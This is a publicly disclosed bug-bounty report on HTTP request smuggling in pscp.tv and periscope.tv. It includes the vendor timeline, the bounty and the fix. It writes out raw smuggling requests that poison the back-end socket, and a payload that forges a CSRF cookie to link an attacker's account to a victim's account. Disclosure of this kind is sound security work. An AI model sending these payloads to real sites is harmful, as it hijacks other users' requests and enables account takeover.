---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/http-request-smuggling
  - env/web
substate: "resolved"
weakness: "HTTP Request Smuggling"
enriched: true
body: true
date: 2020-09-10
submitted: 2019-10-13T19:22:23.338Z
bounty_usd: 560
votes: 24
cve: []
program: "[[programs/x|X / xAI]]"
reporter: "protostar0"
source: "https://hackerone.com/reports/713285"
title: "http request smuggling in pscp.tv and periscope.tv"
---
# http request smuggling in pscp.tv and periscope.tv

> **Severity:** High | **Bounty:** 560 USD | **Votes:** 24 | **Program:** X / xAI | **Disclosed:** 2020-09-10

- Report: [https://hackerone.com/reports/713285](https://hackerone.com/reports/713285)
- CWE: HTTP Request Smuggling
- Submitted: 2019-10-13T19:22:23.338Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description:** 
the Description of HTTP request smuggling attacks : [here](https://portswigger.net/web-security/request-smuggling)

seems that many subdomains in pscp.tv and periscope.tv vulenrable

##1-Detect HTTP request smuggling attack [504 response with delay (30 s, 60s)] "DoS"

POC & Steps To Reproduce: in this video F606648
Resource: [https://portswigger.net/web-security/request-smuggling/finding] 


##2- [exploit HTTP request smuggling attack ] send two request as one request get two response as one response [low impact]
POC & Steps To Reproduce & impact : in this video F606663
**ps:**
-add the two CRLFs in the end of the second request in GET REQUEST.
-use the valid value of content-length in POST REQUEST.

##3-[exploit HTTP request smuggling attack ]  poison the VICTIM request

POC & Steps To Reproduce & impact : in this video
inject a get request to the victim request F606689 
inject a get request to the victim request F606704 
**ps:**
-don't add the two CRLFs in the end of the second request in GET REQUEST.
-use large value in content-length then the length of request body in POST REQUEST.
Resource:
[exploit] (https://portswigger.net/web-security/request-smuggling/exploiting)

## important:
on a live site with a high volume of traffic like [www.pscp.tv] .it can be hard to prove request smuggling exists without exploiting numerous genuine users in the process.
-in the poc F606704  , i edit the victim request  to my post request `editing the description of my account` and ignore the real victim request. and the description  will change.

## Impact

1-dos
2-bypass csrf token & inject cookie  allow to link attacker account with [google,twitter] victim account
  report : https://hackerone.com/reports/704489
see other impact in 
https://portswigger.net/web-security/request-smuggling/exploiting

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2019-10-15** @protostar0: after prove the exist  HTTP Request Smuggling  ;
now real impact its poising the sockets of back-end and change the request of victims
##[exploit HTTP request smuggling attack ] poison the VICTIM request:
explanation:
--------------
1-attacker send request with payload 
**attacker request **
>GET / HTTP/1.1		
Host: www.pscp.tv
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
>Content-Length: 100
>
>0												
>
>GET /404 HTTP/1.1                        # payload
>Ignore-Requst-victim: req=				 # without two crlf


2- the back-end receive this request as two request , the first request is a valid request will send the response 
3-when back-end server will receive the second request [ payload] , cause the second request doesn't have [two crlf] in the end , the back end wait the next header .This leaves the back-end socket poisoned with the payload

4- the front-end server send the next request [ victim request ] to back-end server ,
**Victim request**
>GET / HTTP/1.1
Host: www.pscp.tv
[two CRLF]



5- the back-end server treat the Victim request as the next header , and receive the [2 crlf] from the victim request.  
**Victim request after poison :**
>GET /404 HTTP/1.1
Ignore-Requst-victim: req=GET / HTTP/1.1
Host: www.pscp.tv
[two CRLF]

6- the the victim receive `404 not found page`
ps:
---  
editing payload to 
>GET /i/google/login?csrf=no-csrf&origin=anyvalue;,newcookie=newvalue; HTTP/1.1
Cookie: pscp-csrf=no-csrf
X-INgor-Victim-request: i=

will bypass csrf and injected cookie , see my report https://hackerone.com/reports/704489

##important:
1- on a live site with a high volume of traffic like [www.pscp.tv] .it can be hard to prove the poising of victim with request smuggling  without exploiting numerous genuine users in the process.
2- you can poising the socket of back-end  server with 2 way :
 a. the payload [second request] is a GET request:   send payload without [two CRLFs] .
 b.  the payload is POST request: put a large value in `Content-Length` in a payload . see POC F608815


 create this POC : without exploiting many users : F608815
---------------------------------
**explanation of poc:**

- in this poc i will poising the back-end server with a VALID POST  REQUEST [payload] with large value of  `Content-Length`.the rest of body will be the `victim Request `
- the payload is editing    my **PROFILE DESCRIPTION** and ignore the request of the victim 
means that the request of the victim after poising will be my REQUEST OF EDITING DESCRIPTION of my profile 
- and will don't get response of second REQUEST [cause injected to victim] and the
 **DESCRIPTION OF MY PROFILE WILL CHANGE WITH SAME VALUE IN THE PAYLOAD**
- **2019-10-15** @protostar0: here more recourse about this vulnerability :
https://www.youtube.com/watch?v=-y82LadA7N4
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
https://portswigger.net/web-security/request-smuggling/exploiting
- **2019-10-16** @bugtriage-sophia: Thank you for your follow-up @protostar0,

We were able to reproduce the behavior you described and will get back to you when we have more information.

Thank you for thinking of Twitter security.
- **Report Triaged**
- **2019-10-16** @protostar0: Thank you for your response.
- **2019-10-23** @protostar0: hi team;
any update .
- **2019-10-23** @yongjink: @protostar0, I apologize for the delay. We are still having internal discussion and will get back to you as soon as we can. Thanks again for thinking about Twitter security!
- **Bounty Awarded**
- **2019-11-01** @protostar0: thank you for bounty,
please, don't forget to be examining the behaviour in other domains `[twitter and mopub]` #715996 and #715990 .
- **2019-12-23** @protostar0: hi team; any update ?!
- **2019-12-26** @yongjink: Hi protostar0, the teams are still working on these and will let you know once there is any update. Thanks for thinking about Twitter security!
- **2020-03-01** @protostar0: hi team, any news here?!
- **2020-04-10** @protostar0: The bug appears to be fixed now !!
- **Report Resolved**
- **2020-05-08** @protostar0: Thank you for your follow-up @yongjink 

i reported this issue in other 3 domain 
twitter, mopub , twimg 
 #715990 , #715996 , #849866 
Can I get a reward or bonus in other report (other domains )?
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
